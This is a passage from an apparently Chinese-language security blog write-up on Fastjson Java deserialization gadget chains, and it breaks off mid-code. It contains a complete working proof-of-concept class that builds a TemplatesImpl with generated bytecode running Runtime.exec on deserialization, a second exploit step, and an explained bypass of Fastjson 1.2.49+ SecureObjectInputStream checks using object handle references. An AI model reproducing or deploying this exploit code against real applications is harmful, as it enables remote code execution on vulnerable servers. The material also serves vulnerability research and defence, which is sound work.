toString()&#125;，</span></span><br><span class="line"><span class="comment"> * 其余类型走“身份字符串”降级。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) 读取“默认持久化字段集”，这是 defaultReadObject 的字段级接口</span></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> ois.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 读取名为 &quot;val&quot; 的字段（若旧版本流里没有该字段则返回默认值 null）</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">valObj</span> <span class="operator">=</span> gf.get(<span class="string">&quot;val&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 兼容/安全处理分支</span></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 情况 A：没写该字段或明确为 null</span></span><br><span class="line">        val = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        <span class="comment">// 情况 B：理想情况——旧流里就是 String，直接使用</span></span><br><span class="line">        val = (String) valObj;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span></span><br><span class="line">            <span class="comment">// 情况 C：无 SecurityManager（现代 JDK 通常如此，安全模型已移除/禁用）</span></span><br><span class="line">            <span class="comment">//       或者 属于“安全的包装类型”——调用它们的 toString 风险可控</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        <span class="comment">// 将非 String 的兼容值统一“字符串化”</span></span><br><span class="line">        val = valObj.toString();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 情况 D：存在 SecurityManager 且类型不在白名单</span></span><br><span class="line">        <span class="comment">// 说明：为避免在不受信类型上执行覆盖的 toString（可能触发任意代码/副作用），</span></span><br><span class="line">        <span class="comment">// 这里采用“身份字符串”降级：不调用目标类方法，仅使用类名和 identityHashCode。</span></span><br><span class="line">        <span class="comment">// 示例：12345678@com.example.UntrustedType</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终 poc 如下，该反序列化链在 1.2.49 版本之前可以成功。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJson1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByteCode = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classByteCode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span> [] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用 Javassist 生成一个恶意类字节码：</span></span><br><span class="line"><span class="comment">     * - 类名 EvilClass</span></span><br><span class="line"><span class="comment">     * - 继承 AbstractTranslet（必须，否则不会被选为“主类”实例化）</span></span><br><span class="line"><span class="comment">     * - 构造器里执行命令</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类 EvilClass</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造器：一旦实例化，就会执行系统命令</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 class 文件版本，49 对应 Java 5，兼容性更好</span></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置父类为 AbstractTranslet（必须继承它才能被实例化）</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回生成的字节码数组</span></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过反射修改对象的私有字段值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 绕过 private 限制</span></span><br><span class="line">        field.set(object, value);  <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从 1.2.49 开始，<code>JSONArray</code> 以及 <code>JSONObject</code> 方法开始真正有了自己的 <code>readObject</code> 方法。</p>
<p>以 <code>JSONArray#readObject</code> 为例，该函数使用 <code>com.alibaba.fastjson.JSONObject.SecureObjectInputStream</code> 包装原始的 <code>ObjectInputStream</code>，然后再调用 <code>SecureObjectInputStream#defaultReadObject</code> 执行默认反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(<span class="keyword">final</span> java.io.ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// 1) 预检测/初始化：确认 SecureObjectInputStream 能否在当前环境正确工作</span></span><br><span class="line">    JSONObject.SecureObjectInputStream.ensureFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若“安全字段”可用且初始化未报错，走安全包装路径</span></span><br><span class="line">    <span class="keyword">if</span> (JSONObject.SecureObjectInputStream.fields != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; !JSONObject.SecureObjectInputStream.fields_error) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用“安全版 OIS”包装原始流：通常会重写 resolveClass/resolveProxyClass 等</span></span><br><span class="line">        <span class="comment">// 在类型解析环节做白/黑名单检查，提前阻断危险类型</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">secIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>.SecureObjectInputStream(in);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在受限输入流上执行默认反序列化（只读本类声明的可持久化字段）</span></span><br><span class="line">        secIn.defaultReadObject();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 回退路径：直接在原始流上做默认反序列化</span></span><br><span class="line">    in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 随后对关键容器中的元素逐个做 autoType 复核（补救式的运行时校验）</span></span><br><span class="line">    <span class="keyword">for</span> (Object item : list) &#123;</span><br><span class="line">        <span class="keyword">if</span> (item != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 以实际运行时类名做 autoType 检查：</span></span><br><span class="line">            <span class="comment">// - 命中黑名单或未启用/未匹配白名单将抛出 JSONException/安全异常</span></span><br><span class="line">            <span class="comment">// - 第二个参数 expectClass 传 null，按全局配置判定</span></span><br><span class="line">            ParserConfig.global.checkAutoType(item.getClass().getName(), <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>SecureObjectInputStream</code> 继承于 <code>ObjectInputStream</code>，并且重写了 <code>resolveClass</code> 和 <code>resolveProxyClass</code> 两个负责加载类的函数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将 JDK 反序列化的“类解析阶段”与 fastjson 的 autoType 校验打通：</span></span><br><span class="line"><span class="comment"> * 在真正加载类（或生成代理类）之前，先用 ParserConfig 依据黑/白名单做拦截。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 作用与时机：</span></span><br><span class="line"><span class="comment"> * - ObjectInputStream 在读取到类描述符后，会调用 resolveClass / resolveProxyClass</span></span><br><span class="line"><span class="comment"> *   去把“类名/接口名列表”解析为本地 Class；此处重写这两个钩子，可在“对象尚未创建”前阻断。</span></span><br><span class="line"><span class="comment"> * - 若命中黑名单或未被允许，ParserConfig.global.checkAutoType(...) 会抛异常，</span></span><br><span class="line"><span class="comment"> *   反序列化流程立即失败（上层通常表现为 InvalidClassException/JSONException 等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 说明：</span></span><br><span class="line"><span class="comment"> * - 这里传入 expectClass = null，按全局 ParserConfig 的策略进行校验（白/黑名单、开关等）。</span></span><br><span class="line"><span class="comment"> * - super.resolveClass(desc) 的默认行为会使用“最近的用户类加载器”去加载类并校验 SUID；</span></span><br><span class="line"><span class="comment"> *   若 SUID 不匹配，将在后续阶段抛 InvalidClassException。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="comment">// 先做 fastjson 的 autoType 校验（黑/白名单）</span></span><br><span class="line">    ParserConfig.global.checkAutoType(name, <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// 再走 JDK 默认解析：按 latestUserDefinedLoader() 加载类，后续还会做 SUID 比对</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 代理类解析钩子：在生成动态代理类之前，对“参与的每个接口名”做 autoType 校验。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 过程：</span></span><br><span class="line"><span class="comment"> * 1) 逐个接口名 checkAutoType(...)：</span></span><br><span class="line"><span class="comment"> *    - 任一接口不被允许 → 立即抛异常，阻断反序列化；</span></span><br><span class="line"><span class="comment"> * 2) 交给 super.resolveProxyClass(interfaces)：</span></span><br><span class="line"><span class="comment"> *    - 默认会用最新的用户类加载器加载这些接口；</span></span><br><span class="line"><span class="comment"> *    - 若存在非 public 接口，要求它们来自同一个 ClassLoader，并用该 Loader 定义代理类；</span></span><br><span class="line"><span class="comment"> *      否则可能抛 IllegalAccessError；</span></span><br><span class="line"><span class="comment"> *    - 最终通过 Proxy.getProxyClass(loader, ifaces) 生成代理类 Class。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces)</span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">for</span> (String ifaceName : interfaces) &#123;</span><br><span class="line">        <span class="comment">// 对每个接口名执行 fastjson 的 autoType 校验</span></span><br><span class="line">        ParserConfig.global.checkAutoType(ifaceName, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 交回给 JDK 默认逻辑：执行接口加载、可访问性检查、以及代理类生成</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这两个函数分别会对类名以及代理类实现的接口名进行 FastJson 的 autoType 校验。因此我们构造的 <code>JsonArray</code> 中所有的属性以及属性的属性等对应的类在加载时都会经过 autoType 校验。</p>
<p>然而显然这个校验是可以绕过的。因为在 Java 反序列化的过程中，如果一个类不是 <code>unshared</code>，那么这个类一旦加载并实例化后，会被放在对象句柄表（<code>handles</code>）中。</p>
<p>例如对于普通对象，<code>readNonProxyDesc</code> 函数调用 <code>resolveClass</code> 根据 <code>ObjectStreamClass</code> 中的信息从本地加载类，然后通过 <code>desc.initNonProxy</code> 将加载的类放到了 <code>ObjectStreamClass</code> 中。而 <code>ObjectStreamClass</code> 存放在对象句柄表 <code>handles</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 2) 创建空的 OSC，并分配句柄（unshared 时登记特殊标记以禁止后续回引）</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">desc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectStreamClass</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">descHandle</span> <span class="operator">=</span> handles.assign(unshared ? unsharedMarker : desc);</span><br><span class="line"><span class="comment">// 在真正完成前，passHandle 暂置为空，避免“半成品”被使用</span></span><br><span class="line">passHandle = NULL_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) 读取“类描述符主体”（classDescBody）</span></span><br><span class="line"><span class="comment">//    - 等价于写端的 writeClassDescriptor(desc)</span></span><br><span class="line"><span class="comment">//    - 包括：类名、serialVersionUID、flags、字段表等</span></span><br><span class="line"><span class="type">ObjectStreamClass</span> <span class="variable">readDesc</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    readDesc = readClassDescriptor();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">    <span class="comment">// 读取“主体”阶段就需要加载某些类型签名，失败则包装为 InvalidClassException</span></span><br><span class="line">    <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(</span><br><span class="line">        <span class="string">&quot;failed to read class descriptor&quot;</span>).initCause(ex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 尝试把描述符解析为本地 Class，并做包访问校验</span></span><br><span class="line">Class&lt;?&gt; cl = <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassNotFoundException</span> <span class="variable">resolveEx</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切到块数据模式，准备读取/跳过“类注解块”（classAnnotations）</span></span><br><span class="line">bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">checksRequired</span> <span class="operator">=</span> isCustomSubclass(); <span class="comment">// 自定义子类需做额外的包访问检查</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// resolveClass：把 readDesc 指向的类名解析为本地 Class（可被子类覆盖）</span></span><br><span class="line">    <span class="keyword">if</span> ((cl = resolveClass(readDesc)) == <span class="literal">null</span>) &#123;</span><br><span class="line">        resolveEx = <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;null class&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (checksRequired) &#123;</span><br><span class="line">        <span class="comment">// 安全：自定义子类时校验包访问权限，避免越权加载敏感包</span></span><br><span class="line">        ReflectUtil.checkPackageAccess(cl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">    resolveEx = ex; <span class="comment">// 暂存，稍后绑定到描述符句柄</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 6) 读取“父类描述符”，并初始化 OSC</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    totalObjectRefs++; <span class="comment">// 统计（供过滤器限额评估）</span></span><br><span class="line">    depth++;           <span class="comment">// 嵌套深度（控制回调/异常传播范围）</span></span><br><span class="line">    <span class="comment">// initNonProxy：将“读取到的主体信息 + 解析到的 Class（或异常） +</span></span><br><span class="line">    <span class="comment">//               父类描述符”组合进当前描述符</span></span><br><span class="line">    desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(<span class="literal">false</span>));</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    depth--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7) 标记该描述符构建完成，允许后续通过句柄回引；设置 passHandle 并返回</span></span><br><span class="line">handles.finish(descHandle);</span><br><span class="line">passHandle = descHandle;</span><br></pre></td></tr></table></figure></div>

<p>而后续相同的对象在序列化数据中是以“对象句柄引用”的形式存在，因此在反序列化的时候走的是 <code>readHandle</code> 逻辑直接根据句柄值从 <code>handles</code> 中取对象并返回，因此不会调用到 <code>resolveClass</code> 或 <code>resolveProxyClass</code> 函数加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查出该句柄所对应的对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> handles.lookupObject(passHandle);</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以向 <code>List</code>、<code>Set</code>、<code>Map</code> 等类型的容器中分别添加 <code>TemplatesImpl</code> 和前面构造的 <code>JsonArray</code>，确保 <code>JsonArray</code> 中的 <code>TemplatesImpl</code> 是对象引用即可绕过。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 